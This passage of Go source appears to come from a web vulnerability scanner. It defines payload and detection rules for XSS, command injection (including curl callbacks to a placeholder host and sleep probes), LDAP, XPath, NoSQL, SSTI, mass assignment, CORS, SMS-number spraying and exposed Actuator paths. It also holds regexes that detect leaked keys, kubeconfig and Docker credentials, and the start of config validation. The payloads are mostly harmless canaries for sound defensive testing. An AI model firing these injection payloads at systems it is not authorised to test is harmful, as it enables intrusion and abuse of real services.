			{Name: "Python 文件", Payload: "jungle-happy-scan-canary.py", Mime: "text/x-python", Expected: `(?i)(upload(?:ed)?\s+success|successfully\s+uploaded|上传成功|保存成功|"(?:code|status)"\s*:\s*"?(?:0|200|000000)"?)`},
			{Name: "双扩展 JSP", Payload: "jungle-happy-scan-canary.jpg.jsp", Mime: "image/jpeg", Expected: `(?i)(upload(?:ed)?\s+success|successfully\s+uploaded|上传成功|保存成功|"(?:code|status)"\s*:\s*"?(?:0|200|000000)"?)`, Mode: "deep"},
			{Name: "JSP 无害执行确认", Kind: "execute_canary", Payload: "jungle-happy-scan-exec.jsp", Mime: "application/octet-stream", Expected: `(?i)(upload(?:ed)?\s+success|successfully\s+uploaded|上传成功|保存成功|"(?:code|status)"\s*:\s*"?(?:0|200|000000)"?)`, Mode: "deep"},
		}},
		"sensitive_data": {Patterns: []DetectionRule{
			{Name: "Java 异常堆栈", Pattern: `(?m)(?:^|\n)\s*at\s+[a-zA-Z_$][\w$]*(?:\.[\w$]+)+\([^\n]+\.java:\d+\)`, Severity: "medium", Confidence: "certain"},
			{Name: "SQL 语句", Pattern: `(?is)\b(?:select\s+.{1,200}?\s+from|insert\s+into|update\s+\w+\s+set|delete\s+from)\b.{0,300}`, Severity: "medium", Confidence: "firm"},
			{Name: "数据库连接串", Pattern: `(?i)jdbc:(?:mysql|postgresql|gaussdb|opengauss|oracle|h2):[^\s"']+`, Severity: "high", Confidence: "certain"},
			{Name: "私钥", Pattern: `-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----`, Severity: "critical", Confidence: "certain"},
			{Name: "JWT", Pattern: `\beyJ[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}\.[a-zA-Z0-9_-]{5,}\b`, Severity: "medium", Confidence: "certain"},
			{Name: "Linux 绝对文件路径", Pattern: `(?:/[a-zA-Z0-9_.-]+){4,}`, Severity: "low", Confidence: "firm"},
			{Name: "中国大陆手机号", Pattern: `(?:^|\D)(1[3-9]\d{9})(?:\D|$)`, Severity: "medium", Confidence: "firm"},
			{Name: "中国身份证号", Pattern: `(?:^|\D)(\d{17}[0-9Xx])(?:\D|$)`, Severity: "high", Confidence: "certain"},
			{Name: "银行卡号", Pattern: `(?:^|\D)(\d{13,19})(?:\D|$)`, Severity: "high", Confidence: "certain"},
			{Name: "邮箱地址", Pattern: `(?i)(?:^|[^A-Z0-9._%+-])([A-Z0-9._%+-]{1,64}@[A-Z0-9.-]+\.[A-Z]{2,63})(?:[^A-Z0-9._%+-]|$)`, Severity: "medium", Confidence: "firm"},
			{Name: "IP 地址", Pattern: `(?:^|[^0-9])((?:25[0-5]|2[0-4]\d|1?\d?\d)(?:\.(?:25[0-5]|2[0-4]\d|1?\d?\d)){3})(?:[^0-9]|$)`, Severity: "low", Confidence: "certain"},
			{Name: "Kubernetes Kubeconfig 凭据", Pattern: `(?is)((?:apiVersion:\s*v1.{0,1000}kind:\s*Config\b|kind:\s*Config\b.{0,1000}apiVersion:\s*v1).{0,1000}(?:client-certificate-data|client-key-data|token):\s*[^\s]+)`, Severity: "critical", Confidence: "certain"},
			{Name: "Kubernetes Secret 清单", Pattern: `(?is)(kind:\s*Secret\b.{0,800}(?:data|stringData):\s*(?:\r?\n\s+[A-Za-z0-9_.-]+:\s*[^\s]+)+)`, Severity: "critical", Confidence: "certain"},
			{Name: "Kubernetes ServiceAccount 凭据路径", Pattern: `(?i)(KUBERNETES_SERVICE_HOST|/var/run/secrets/kubernetes\.io/serviceaccount/(?:token|namespace|ca\.crt))`, Severity: "high", Confidence: "certain"},
			{Name: "Docker Registry 认证信息", Pattern: `(?is)("auths"\s*:\s*\{.{0,1000}"auth"\s*:\s*"[A-Za-z0-9+/=]{8,}")`, Severity: "critical", Confidence: "certain"},
			{Name: "Docker 认证环境变量", Pattern: `(?is)(DOCKER_AUTH_CONFIG\s*[=:]\s*['"]?\{.{0,1000}"auth"\s*:)`, Severity: "critical", Confidence: "certain"},
			{Name: "Docker Socket 路径", Pattern: `(?i)((?:unix://)?/var/run/docker\.sock)`, Severity: "high", Confidence: "certain"},
			{Name: "微信小程序 AppSecret", Pattern: `(?is)(?:\"?(?:appsecret|appsecrect|app_secret|wx_app_secret|wechat_app_secret)\"?\s*[:=]\s*\"?)([A-Za-z0-9_-]{16,64})`, Severity: "critical", Confidence: "certain"},
		}},
		"error_disclosure": {
			Payloads: []PayloadRule{
				{Name: "单引号异常", Payload: "{{value}}'"},
				{Name: "双引号异常", Payload: "{{value}}\""},
				{Name: "反斜杠异常", Payload: `{{value}}\`},
				{Name: "超大整数边界", Payload: "9223372036854775808", Mode: "deep"},
				{Name: "非法日期边界", Payload: "9999-99-99T99:99:99", Mode: "deep"},
				{Name: "空字节文本", Payload: "{{value}}%00", Mode: "deep"},
			},
			Patterns: []DetectionRule{
				{Name: "Java 异常堆栈", Pattern: `(?is)(?:Caused by:\s*)?(?:java|javax|jakarta|org\.springframework|org\.apache\.ibatis)\.[\w.$]+(?:Exception|Error)(?::[^\r\n]{0,300})?.{0,700}?\bat\s+[\w$]+(?:\.[\w$]+)+\([^\r\n]+\.java:\d+\)`, Severity: "medium", Confidence: "certain"},
				{Name: "Spring/Jackson 参数异常", Pattern: `(?is)(HttpMessageNotReadableException|MethodArgumentTypeMismatchException|NestedServletException|BindException|SpelEvaluationException|MismatchedInputException|InvalidFormatException|JsonMappingException|JsonParseException|ConstraintViolationException)`, Severity: "medium", Confidence: "certain"},
				{Name: "JSP/Servlet 容器异常", Pattern: `(?is)(org\.apache\.jasper\.(?:JasperException|runtime\.[\w.$]+)|javax\.servlet\.(?:ServletException|jsp\.[\w.$]+)|jakarta\.servlet\.(?:ServletException|jsp\.[\w.$]+)|HTTP Status 500.{0,500}(?:Apache Tomcat|Exception Report)|The server encountered an internal error.{0,500}Tomcat)`, Severity: "medium", Confidence: "certain"},
				{Name: "银行 CTP/自研框架内部堆栈", Pattern: `(?is)(?:com\.(?:icbc|bank|ctp)|cn\.(?:icbc|bank|ctp))\.[\w.$]+(?:Exception|Error)?.{0,700}?\bat\s+(?:com|cn)\.(?:icbc|bank|ctp)\.[\w.$]+\([^\r\n]+\.java:\d+\)`, Severity: "medium", Confidence: "certain"},
				{Name: "MyBatis/SQL 调试信息", Pattern: `(?is)(#{3}\s*(?:Error (?:querying|updating) database|SQL:|Cause:)|The error may exist in .{0,200}(?:Mapper|\.xml)|BadSqlGrammarException|PersistenceException|CallableStatement|PreparedStatement.{0,200}(?:SELECT|INSERT|UPDATE|DELETE))`, Severity: "high", Confidence: "certain"},
				{Name: "数据库异常详情", Pattern: `(?is)(PSQLException|MySQLSyntaxErrorException|SQLSTATE\s*[:\[]|You have an error in your SQL syntax|invalid input syntax for (?:type|integer|numeric|uuid))`, Severity: "high", Confidence: "certain"},
				{Name: "Linux 服务端绝对路径", Pattern: `(?is)(?:/[A-Za-z0-9_.-]+){4,}/[A-Za-z0-9_.-]+\.(?:java|xml|class|jar)`, Severity: "medium", Confidence: "firm"},
			},
		},
		"nosql_injection": {
			Payloads: []PayloadRule{
				{Name: "MongoDB 操作符真", Kind: "boolean_true", Group: "mongo-operator", Payload: `{"$ne":null}`},
				{Name: "MongoDB 操作符假", Kind: "boolean_false", Group: "mongo-operator", Payload: `{"$eq":"__jhs_no_match_731__"}`},
				{Name: "MongoDB 语法错误", Kind: "error_probe", Payload: `{"$where":"jungle_happy_scan("}`, Mode: "deep"},
			},
			Patterns: []DetectionRule{
				{Name: "MongoDB/BSON 异常", Pattern: `(?is)(MongoServerError|MongoQueryException|MongoCommandException|BsonInvalidOperationException|BSONTypeError|unknown operator.{0,80}\$|invalid operator.{0,80}\$|bad query|Failed to parse.*Mongo)`, Severity: "high", Confidence: "certain"},
				{Name: "Elasticsearch 查询异常", Pattern: `(?is)(x_content_parse_exception|parsing_exception|query_shard_exception|ElasticsearchStatusException|unknown query \[[^\]]+\])`, Severity: "high", Confidence: "certain"},
			},
		},
		"ldap_injection": {
			Payloads: []PayloadRule{
				{Name: "LDAP 过滤器真", Kind: "boolean_true", Group: "ldap-filter", Payload: `{{value}}*)(|(objectClass=*))`},
				{Name: "LDAP 过滤器假", Kind: "boolean_false", Group: "ldap-filter", Payload: `{{value}}*)(objectClass=__jhs_no_match_731__)`},
				{Name: "LDAP 括号破坏", Kind: "error_probe", Payload: `{{value}})(`},
			},
			Patterns: []DetectionRule{{Name: "LDAP 过滤器异常", Pattern: `(?is)(InvalidSearchFilterException|javax\.naming\.(?:directory\.)?InvalidSearchFilterException|LDAPException.{0,180}(?:filter|search)|Bad search filter|Unbalanced parenthesis|Filter Error Code)`, Severity: "high", Confidence: "certain"}},
		},
		"xpath_injection": {
			Payloads: []PayloadRule{
				{Name: "XPath 字符串真", Kind: "boolean_true", Group: "xpath-string", Payload: `{{value}}' or '731'='731`},
				{Name: "XPath 字符串假", Kind: "boolean_false", Group: "xpath-string", Payload: `{{value}}' or '731'='732`},
				{Name: "XPath 语法破坏", Kind: "error_probe", Payload: `{{value}}'[`},
			},
			Patterns: []DetectionRule{{Name: "XPath 解析异常", Pattern: `(?is)(XPathExpressionException|XPathException|SAXPathException|Invalid XPath|A location step was expected|javax\.xml\.xpath|net\.sf\.saxon.{0,120}(?:error|exception)|Unclosed literal in XPath)`, Severity: "high", Confidence: "certain"}},
		},
		"java_deserialization": {
			ParameterNames: []string{"data", "payload", "object", "serialized", "state", "token"},
			Payloads: []PayloadRule{
				{Name: "畸形 Java ObjectStream", Kind: "error_probe", Payload: "rO0ABXNyAANqaHM="},
				{Name: "畸形 Hessian 对象", Kind: "error_probe", Payload: "SAJq\n"},
				{Name: "畸形 Java ObjectStream 深度复核", Kind: "error_probe", Payload: "rO0ABXNyABFqdW5nbGVfaGFwcHlfc2Nhbg==", Mode: "deep"},
			},
			Patterns: []DetectionRule{{Name: "Java 反序列化异常", Pattern: `(?is)(ObjectInputStream|ObjectStreamClass|StreamCorruptedException|InvalidClassException|OptionalDataException|WriteAbortedException|SerializationException|HessianProtocolException|KryoException|InvalidTypeIdException|could not resolve type id|could not deserialize)`, Severity: "high", Confidence: "certain"}},
		},
		"method_override": {Payloads: []PayloadRule{
			{Name: "X-HTTP-Method-Override DELETE", Kind: "header", Header: "X-HTTP-Method-Override", Payload: "DELETE", Expected: `(?is)(?:deleted|删除成功|"status"\s*:\s*"?(?:deleted|success))`},
			{Name: "Spring query _method DELETE", Kind: "query_param", Group: "_method", Payload: "DELETE", Expected: `(?is)(?:deleted|删除成功|"status"\s*:\s*"?(?:deleted|success))`},
			{Name: "Spring form _method DELETE", Kind: "form_param", Group: "_method", Payload: "DELETE", Expected: `(?is)(?:deleted|删除成功|"status"\s*:\s*"?(?:deleted|success))`},
			{Name: "Spring multipart _method DELETE", Kind: "multipart_param", Group: "_method", Payload: "DELETE", Expected: `(?is)(?:deleted|删除成功|"status"\s*:\s*"?(?:deleted|success))`},
			{Name: "X-HTTP-Method-Override PUT", Kind: "header", Header: "X-HTTP-Method-Override", Payload: "PUT", Expected: `(?is)(?:updated|修改成功|更新成功)`},
			{Name: "X-Method-Override PATCH", Kind: "header", Header: "X-Method-Override", Payload: "PATCH", Expected: `(?is)(?:updated|修改成功|更新成功)`, Mode: "deep"},
		}},
		"mass_assignment": {Payloads: []PayloadRule{
			{Name: "管理员标识", Group: "isAdmin", Payload: "true", Expected: `(?is)"isAdmin"\s*:\s*true`},
			{Name: "角色字段", Group: "role", Payload: `"admin"`, Expected: `(?is)"role"\s*:\s*"admin"`},
			{Name: "机构归属", Group: "orgId", Payload: `"jhs-org-731"`, Expected: `(?is)"orgId"\s*:\s*"jhs-org-731"`},
			{Name: "数据所有者", Group: "ownerId", Payload: `"jhs-owner-731"`, Expected: `(?is)"ownerId"\s*:\s*"jhs-owner-731"`},
			{Name: "审批状态", Group: "status", Payload: `"approved"`, Expected: `(?is)"status"\s*:\s*"approved"`, Mode: "deep"},
			{Name: "启用标识", Group: "enabled", Payload: "true", Expected: `(?is)"enabled"\s*:\s*true`, Mode: "deep"},
			{Name: "嵌套角色字段", Group: "user.role", Payload: `"admin"`, Expected: `(?is)"role"\s*:\s*"admin"`, Mode: "deep"},
		}},
		"mybatis_dynamic_sql": {
			ParameterNames: []string{"sort", "order", "orderBy", "order_by", "column", "field", "fields", "table", "tableName", "table_name", "groupBy", "group_by", "direction", "queryColumn"},
			Payloads: []PayloadRule{
				{Name: "追加不存在排序列", Kind: "fragment_break", Payload: "{{value}},jhs_invalid_column_731", Expected: "jhs_invalid_column_731"},
				{Name: "追加不存在字段深度变体", Kind: "fragment_break", Payload: "{{value}} DESC,jhs_invalid_column_731", Expected: "jhs_invalid_column_731", Mode: "deep"},
			},
			Patterns: []DetectionRule{
				{Name: "MySQL 不存在列", Pattern: `(?is)(Unknown column .{0,160}jhs_invalid_column_731|jhs_invalid_column_731.{0,160}(?:unknown column|SQLSyntaxErrorException))`, Severity: "high", Confidence: "certain"},
				{Name: "PostgreSQL 不存在列", Pattern: `(?is)(column .{0,120}jhs_invalid_column_731.{0,80}does not exist|jhs_invalid_column_731.{0,160}PSQLException)`, Severity: "high", Confidence: "certain"},
				{Name: "MyBatis/JDBC 动态 SQL", Pattern: `(?is)(jhs_invalid_column_731.{0,300}(?:BadSqlGrammarException|PersistenceException|SQLSyntaxErrorException|SQLException)|(?:BadSqlGrammarException|PersistenceException|SQLSyntaxErrorException|SQLException).{0,300}jhs_invalid_column_731)`, Severity: "high", Confidence: "certain"},
			},
		},
		"path_normalization":  {},
		"parameter_confusion": {},
		"json_polymorphic": {
			Payloads: []PayloadRule{
				{Name: "Fastjson SafeMode 探针", Group: "@type", Payload: `"jungle.happy.scan.SafeModeProbe731"`, Expected: "jungle.happy.scan.SafeModeProbe731"},
			},
			Patterns: []DetectionRule{
				{Name: "Fastjson SafeMode 已开启", Pattern: `(?is)safeMode\s+not\s+support\s+autoType`, Severity: "info", Confidence: "certain"},
				{Name: "Fastjson SafeMode 未开启特征", Pattern: `(?is)(?:autoType\s+is\s+not\s+support|com\.alibaba\.fastjson|fastjson(?:2)?\.JSONException|type\s+not\s+match|ClassNotFoundException).{0,600}jungle\.happy\.scan\.SafeModeProbe731|jungle\.happy\.scan\.SafeModeProbe731.{0,600}(?:autoType\s+is\s+not\s+support|com\.alibaba\.fastjson|fastjson(?:2)?\.JSONException|type\s+not\s+match|ClassNotFoundException)`, Severity: "high", Confidence: "certain"},
			},
		},
		"graphql_security": {
			Paths: []string{"/graphql"},
			Payloads: []PayloadRule{
				{Name: "Schema Introspection", Kind: "introspection", Payload: `{__schema{queryType{name} types{name}}}`, Expected: `(?is)"__schema"\s*:\s*\{.{0,1000}"queryType"`},
				{Name: "字段建议", Kind: "suggestion", Payload: `{__jungle_happy_scan_invalid_field__}`, Expected: `(?i)did you mean`},
				{Name: "20 项 JSON 批量请求", Kind: "batch", Payload: `[{"query":"{__typename}"}]`, Expected: `(?is)^\s*\[`},
				{Name: "32 别名批处理", Kind: "alias_batch", Payload: `{jhs1:__typename jhs32:__typename}`, Expected: `(?is)"jhs1".{0,1000}"jhs32"`, Mode: "deep"},
			},
		},
		"cors": {Payloads: []PayloadRule{{Name: "任意来源", Payload: "https://jungle-happy-scan.invalid"}, {Name: "null 来源", Payload: "null"}, {Name: "后缀绕过", Payload: "https://{{host}}.jungle-happy-scan.invalid", Mode: "deep"}}},
		"reflected_xss": {Payloads: []PayloadRule{
			{Name: "HTML 文本", Kind: "html-text", Payload: `{{token}}<svg/onload=confirm("{{token}}")>`},
			{Name: "属性上下文", Kind: "attribute", Payload: `{{token}}"><svg/onload=confirm("{{token}}")>`},
			{Name: "双引号属性上下文", Kind: "attribute-double", Payload: `{{token}}"><svg/onload=confirm("{{token}}")>`},
			{Name: "单引号属性上下文", Kind: "attribute-single", Payload: `{{token}}'><svg/onload=confirm("{{token}}")>`},
			{Name: "无引号属性上下文", Kind: "attribute-unquoted", Payload: `{{token}}><svg/onload=confirm("{{token}}")>`},
			{Name: "脚本单引号字符串", Kind: "script-single", Payload: `{{token}}';confirm("{{token}}");//`},
			{Name: "脚本双引号字符串", Kind: "script-double", Payload: `{{token}}";confirm("{{token}}");//`},
			{Name: "脚本模板字符串", Kind: "script-template", Payload: "{{token}}`;confirm(\"{{token}}\");//"},
			{Name: "脚本代码上下文", Kind: "script-code", Payload: `{{token}};confirm("{{token}}");//`},
			{Name: "兼容旧配置的脚本上下文", Kind: "script", Payload: `{{token}}';confirm("{{token}}");//`},
			{Name: "标签上下文", Kind: "tag", Payload: `{{token}}><svg/onload=confirm("{{token}}")>`},
		}},
		"ssrf":           {ParameterNames: []string{"url", "uri", "link", "callback", "webhook", "redirect", "avatar", "image", "endpoint", "host", "domain", "target"}, Payloads: []PayloadRule{{Name: "回连 URL", Payload: "{{callback}}"}}},
		"open_redirect":  {ParameterNames: []string{"redirect", "return", "next", "continue", "target", "url", "callback"}, Payloads: []PayloadRule{{Name: "外部 HTTPS", Payload: "https://jungle-happy-scan.invalid/{{token}}"}}},
		"crlf_injection": {Payloads: []PayloadRule{{Name: "CRLF 响应头", Payload: "{{value}}\r\nX-Jungle-Happy-Scan-Canary: {{token}}", Header: "X-Jungle-Happy-Scan-Canary"}}},
		"ssti":           {Payloads: []PayloadRule{{Name: "Jinja/Twig", Payload: "{{7331*3}}", Expected: "21993"}, {Name: "EL/Freemarker", Payload: "${7331*3}", Expected: "21993", Mode: "deep"}}},
		"spring_actuator": {Paths: []string{
			"/actuator", "/actuator/health", "/actuator/env", "/actuator/beans", "/actuator/configprops",
			"/actuator/mappings", "/actuator/loggers", "/actuator/threaddump", "/actuator/conditions",
			"/actuator/scheduledtasks", "/actuator/caches", "/actuator/prometheus", "/actuator/httptrace",
			"/actuator/flyway", "/actuator/liquibase", "/actuator/gateway/routes", "/actuator/jolokia",
			"/management", "/management/env", "/management/mappings", "/druid/index.html", "/druid/login.html",
			"/h2-console", "/jolokia", "/springbootadmin", "/applications",
		}},
		"api_exposure": {Paths: []string{
			"/v3/api-docs", "/v2/api-docs", "/api-docs", "/openapi.json", "/openapi.yaml",
			"/v3/api-docs/swagger-config", "/swagger-resources", "/swagger-resources/configuration/ui", "/swagger-ui.html",
			"/swagger-ui/index.html", "/doc.html",
		}},
		"command_injection": {ParameterNames: []string{"cmd", "command", "exec", "execute", "executable", "program", "process", "script", "code", "expression", "groovy", "engine", "host", "ip", "path", "backuppath", "file", "url", "target"}, Payloads: []PayloadRule{
			{Name: "算术输出 canary", Kind: "output", Payload: "{{value}};printf JHS_%s $(({{left}}+{{right}}))", Expected: "JHS_{{sum}}"},
			{Name: "管道算术输出 canary", Kind: "output", Payload: "{{value}}|printf JHS_%s $(({{left}}+{{right}}))", Expected: "JHS_{{sum}}"},
			{Name: "逻辑或算术输出 canary", Kind: "output", Payload: "{{value}}||printf JHS_%s $(({{left}}+{{right}}))", Expected: "JHS_{{sum}}"},
			{Name: "逻辑与算术输出 canary", Kind: "output", Payload: "{{value}}&&printf JHS_%s $(({{left}}+{{right}}))", Expected: "JHS_{{sum}}"},
			{Name: "换行算术输出 canary", Kind: "output", Payload: "{{value}}\nprintf JHS_%s $(({{left}}+{{right}}))", Expected: "JHS_{{sum}}"},
			{Name: "反引号算术输出 canary", Kind: "output", Payload: "{{value}}`printf JHS_%s $(({{left}}+{{right}}))`", Expected: "JHS_{{sum}}"},
			{Name: "美元括号算术输出 canary", Kind: "output", Payload: "{{value}}$(printf JHS_%s $(({{left}}+{{right}})))", Expected: "JHS_{{sum}}"},
			{Name: "Runtime.exec/ProcessBuilder 直接命令", Kind: "direct_output", Payload: "expr {{left}} + {{right}}", Expected: "{{sum}}"},
			{Name: "curl 离线回连", Kind: "callback", Payload: "{{value}};curl -fsS --max-time 3 '{{callback}}' >/dev/null", Mode: "deep"},
			{Name: "反引号 curl 离线回连", Kind: "callback", Payload: "`curl -fsS --max-time 3 '{{callback}}' >/dev/null`", Mode: "deep"},
			{Name: "美元括号 curl 离线回连", Kind: "callback", Payload: "$(curl -fsS --max-time 3 '{{callback}}' >/dev/null)", Mode: "deep"},
			{Name: "管道 curl 离线回连", Kind: "callback", Payload: "{{value}}|curl -fsS --max-time 3 '{{callback}}' >/dev/null", Mode: "deep"},
			{Name: "逻辑或 curl 离线回连", Kind: "callback", Payload: "{{value}}||curl -fsS --max-time 3 '{{callback}}' >/dev/null", Mode: "deep"},
			{Name: "逻辑与 curl 离线回连", Kind: "callback", Payload: "{{value}}&&curl -fsS --max-time 3 '{{callback}}' >/dev/null", Mode: "deep"},
			{Name: "换行 curl 离线回连", Kind: "callback", Payload: "{{value}}\ncurl -fsS --max-time 3 '{{callback}}' >/dev/null", Mode: "deep"},
			{Name: "延时", Kind: "delay", Group: "sleep", Payload: "{{value}};sleep 2", Mode: "deep"},
			{Name: "延时控制", Kind: "control", Group: "sleep", Payload: "{{value}};sleep 0", Mode: "deep"},
			{Name: "反引号 sleep 延时", Kind: "delay", Group: "backtick-sleep", Payload: "`sleep 2`", Mode: "deep"},
			{Name: "反引号 sleep 对照", Kind: "control", Group: "backtick-sleep", Payload: "`sleep 0`", Mode: "deep"},
			{Name: "美元括号 sleep 延时", Kind: "delay", Group: "dollar-sleep", Payload: "$(sleep 2)", Mode: "deep"},
			{Name: "美元括号 sleep 对照", Kind: "control", Group: "dollar-sleep", Payload: "$(sleep 0)", Mode: "deep"},
			{Name: "管道 sleep 延时", Kind: "delay", Group: "pipe-sleep", Payload: "{{value}}|sleep 2", Mode: "deep"},
			{Name: "管道 sleep 对照", Kind: "control", Group: "pipe-sleep", Payload: "{{value}}|sleep 0", Mode: "deep"},
			{Name: "逻辑或 sleep 延时", Kind: "delay", Group: "or-sleep", Payload: "{{value}}||sleep 2", Mode: "deep"},
			{Name: "逻辑或 sleep 对照", Kind: "control", Group: "or-sleep", Payload: "{{value}}||sleep 0", Mode: "deep"},
			{Name: "逻辑与 sleep 延时", Kind: "delay", Group: "and-sleep", Payload: "{{value}}&&sleep 2", Mode: "deep"},
			{Name: "逻辑与 sleep 对照", Kind: "control", Group: "and-sleep", Payload: "{{value}}&&sleep 0", Mode: "deep"},
			{Name: "换行 sleep 延时", Kind: "delay", Group: "newline-sleep", Payload: "{{value}}\nsleep 2", Mode: "deep"},
			{Name: "换行 sleep 对照", Kind: "control", Group: "newline-sleep", Payload: "{{value}}\nsleep 0", Mode: "deep"},
			{Name: "Groovy/脚本 sleep 延时", Kind: "delay", Group: "groovy-sleep", Payload: "sleep(2000)", Mode: "deep"},
			{Name: "Groovy/脚本 sleep 对照", Kind: "control", Group: "groovy-sleep", Payload: "sleep(0)", Mode: "deep"},
		}},
		"sms_abuse": {
			ParameterNames: []string{"mobile", "mobileNo", "mobilePhone", "phone", "phoneNumber", "telephone", "tel", "smsPhone", "receiverMobile"},
			URLKeywords:    []string{"send"},
			Payloads:       defaultSMSPayloads(),
			Patterns: []DetectionRule{
				{Name: "短信发送成功", Pattern: `(?is)(短信.{0,20}(?:发送|下发).{0,20}成功|验证码.{0,20}(?:发送|下发).{0,20}成功|"(?:code|status)"\s*:\s*"?(?:0|200|000000)"?|"(?:success|successful)"\s*:\s*true)`, Severity: "high", Confidence: "firm"},
			},
		},
		"csrf": {Payloads: []PayloadRule{{Name: "跨站 Origin", Kind: "origin", Payload: "https://jungle-happy-scan.invalid"}}},
		"idor": {ParameterNames: []string{"id", "uid", "uuid", "user", "account", "order", "document", "record"}},
	}
	splitDeepPluginRules(rules)
	return rules
}

// splitDeepPluginRules converts the old hidden payload-strength flag into
// explicit, independently selectable plugin rule sets. Payload.Mode remains in
// the JSON struct only so older configuration files can be migrated safely.
func splitDeepPluginRules(rules map[string]PluginRuleConfig) {
	// The old MyBatis "deep variant" is the same destructive canary family as
	// the normal rule with an added DESC token. There is no separate extension
	// plugin for it, so retaining Mode and later clearing it made the legacy
	// rule run silently in normal scans. Keep the deterministic core probe and
	// discard only that redundant legacy variant.
	myBatis := rules["mybatis_dynamic_sql"]
	if len(myBatis.Payloads) > 0 {
		kept := myBatis.Payloads[:0]
		for _, payload := range myBatis.Payloads {
			if payload.Mode == "deep" {
				continue
			}
			kept = append(kept, payload)
		}
		myBatis.Payloads = kept
		rules["mybatis_dynamic_sql"] = myBatis
	}

	type route struct {
		source string
		target func(PayloadRule) string
	}
	routes := []route{
		{source: "sqli", target: func(payload PayloadRule) string {
			if payload.Kind == "time_control" || payload.Kind == "time_delay" {
				return "sqli_timing"
			}
			return "sqli_extended"
		}},
		{source: "xxe", target: func(PayloadRule) string { return "xxe_extended" }},
		{source: "file_read", target: func(PayloadRule) string { return "file_read_encoded" }},
		{source: "file_upload", target: func(PayloadRule) string { return "file_upload_execution" }},
		{source: "java_expression", target: func(PayloadRule) string { return "java_expression_extended" }},
		{source: "mass_assignment", target: func(PayloadRule) string { return "mass_assignment_extended" }},
		{source: "graphql_security", target: func(PayloadRule) string { return "graphql_alias_abuse" }},
		{source: "error_disclosure", target: func(PayloadRule) string { return "error_disclosure_extended" }},
		{source: "command_injection", target: func(payload PayloadRule) string {
			if payload.Kind == "callback" {
				return "command_injection_oast"
			}
			return "command_injection_timing"
		}},
	}
	for _, item := range routes {
		source := rules[item.source]
		kept := source.Payloads[:0]
		for _, payload := range source.Payloads {
			if payload.Mode != "deep" {
				payload.Mode = ""
				kept = append(kept, payload)
				continue
			}
			payload.Mode = ""
			targetID := item.target(payload)
			target := rules[targetID]
			if len(target.ParameterNames) == 0 {
				target.ParameterNames = append([]string(nil), source.ParameterNames...)
			}
			if len(target.Paths) == 0 {
				target.Paths = append([]string(nil), source.Paths...)
			}
			if len(target.Patterns) == 0 {
				target.Patterns = append([]DetectionRule(nil), source.Patterns...)
			}
			target.Payloads = append(target.Payloads, payload)
			rules[targetID] = target
		}
		source.Payloads = kept
		rules[item.source] = source
	}
	// Deep flags on inexpensive checks become ordinary deterministic rules of
	// their existing plugin. Selecting that plugin always means the same work.
	for pluginID, rule := range rules {
		for index := range rule.Payloads {
			rule.Payloads[index].Mode = ""
		}
		rules[pluginID] = rule
	}
}

func defaultSMSPayloads() []PayloadRule {
	payloads := make([]PayloadRule, 0, 30)
	for index := range 30 {
		payloads = append(payloads, PayloadRule{
			Name: fmt.Sprintf("喷洒号码 %d", index+1), Kind: "spray_number",
			Payload: fmt.Sprintf("{{prefix}}%04d", 7300+index),
		})
	}
	return payloads
}

func (c Config) Validate() error {
	if c.ConfigVersion < 1 || c.ConfigVersion > currentConfigVersion {
		return fmt.Errorf("config_version 必须在 1 到 %d 之间", currentConfigVersion)
	}
	if strings.TrimSpace(c.Listen) == "" {
		return errors.New("listen 不能为空")
	}
	if _, _, err := net.SplitHostPort(c.Listen); err != nil {
		return fmt.Errorf("listen 格式无效: %w", err)
	}
	if _, _, err := net.SplitHostPort(c.CallbackListen); err != nil {
		return fmt.Errorf("callback_listen 格式无效: %w", err)
	}
	if c.CallbackListen == c.Listen {
		return errors.New("callback_listen 不能与 listen 相同")
	}
	if _, _, err := net.SplitHostPort(c.CallbackLDAPListen); err != nil {
		return fmt.Errorf("callback_ldap_listen 格式无效: %w", err)
	}
	if c.CallbackLDAPListen == c.Listen || c.CallbackLDAPListen == c.CallbackListen {
		return errors.New("callback_ldap_listen 不能与主服务或 HTTP 回连监听相同")
	}
	if c.DefaultScheme != "http" && c.DefaultScheme != "https" {
		return errors.New("default_scheme 必须是 http 或 https")
	}
	if !slices.Contains([]string{"passive", "normal", "standard", "deep"}, c.ScanMode) {
		return errors.New("scan_mode 必须是 passive、normal、standard 或 deep")
	}
	if !slices.Contains([]string{"normalized", "force_http1", "raw_http1"}, c.TransportMode) {
		return errors.New("transport_mode 必须是 normalized、force_http1 或 raw_http1")
	}
	if c.TimeoutSeconds < 1 || c.TimeoutSeconds > 120 {
		return errors.New("timeout_seconds 必须在 1 到 120 之间")
	}
	if c.MaxConcurrency < 1 || c.MaxConcurrency > 100 {
		return errors.New("max_concurrency 必须在 1 到 100 之间")
	}
	if c.MaxActiveScans < 1 || c.MaxActiveScans > 100 {
		return errors.New("max_active_scans 必须在 1 到 100 之间")
	}
	if c.MaxQueuedScans < 1 || c.MaxQueuedScans > 10000 {
		return errors.New("max_queued_scans 必须在 1 到 10000 之间")
	}
	if c.GlobalMaxConcurrency < 1 || c.GlobalMaxConcurrency > 1000 {
		return errors.New("global_max_concurrency 必须在 1 到 1000 之间")
	}
	if c.PerHostConcurrency < 1 || c.PerHostConcurrency > c.GlobalMaxConcurrency {
		return errors.New("per_host_concurrency 必须在 1 到 global_max_concurrency 之间")
	}
	if c.RequestsPerSecond < 0.1 || c.RequestsPerSecond > 500 {
		return errors.New("requests_per_second 必须在 0.1 到 500 之间")
	}
	if c.GlobalRequestsPerSecond < 0.1 || c.GlobalRequestsPerSecond > 5000 {
		return errors.New("global_requests_per_second 必须在 0.1 到 5000 之间")
	}
	if c.MaxResponseBytes < 10_000 || c.MaxResponseBytes > 50_000_000 {
		return errors.New("max_response_bytes 必须在 10000 到 50000000 之间")
	}
	if c.MaxRequests < 1 || c.MaxRequests > 20_000 {
		return errors.New("max_requests 必须在 1 到 20000 之间")
	}
	if c.BaselineSamples < 1 || c.BaselineSamples > 3 {
		return errors.New("baseline_samples 必须在 1 到 3 之间")
	}
	if c.TaskTTLMinutes < 1 || c.TaskTTLMinutes > 1440 {
		return errors.New("task_ttl_minutes 必须在 1 到 1440 之间")
	}
	if c.MaxScansPerMinute < 1 || c.MaxScansPerMinute > 10000 {
		return errors.New("max_scans_per_minute 必须在 1 到 10000 之间")
	}
	if c.CallbackMaxConnections < 1 || c.CallbackMaxConnections > 4096 {
		return errors.New("callback_max_connections 必须在 1 到 4096 之间")
	}
	if c.SharedServiceMode && len(c.AllowedHosts) == 0 {
